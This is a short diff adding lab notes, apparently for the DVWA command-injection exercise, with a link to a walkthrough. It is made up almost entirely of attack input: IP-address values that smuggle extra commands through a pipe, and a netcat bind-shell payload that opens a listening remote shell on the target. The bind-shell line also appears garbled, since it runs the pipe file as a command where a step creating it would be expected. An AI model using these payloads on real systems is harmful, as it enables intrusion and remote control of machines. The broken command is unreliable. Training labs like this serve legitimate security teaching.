@@ -1,0 +1,10 @@
+$192.192.0.1|pwd
+$192.192.0.1|ls /
+$ip addr show
+
+Bind Shell
+"192.168.1.147; /tmp/pipe;sh /tmp/pipe |nc -l 4444 > /tmp/pipe" - Creates a netcat listener,
+then use "nc 172.18.0.2 4444" to connect. (Change IP addresses to match those of target machine)
+
+
+Referência: https://n3dx0o.medium.com/dvwa-command-execution-solutions-low-medium-high-6ee354dc2974
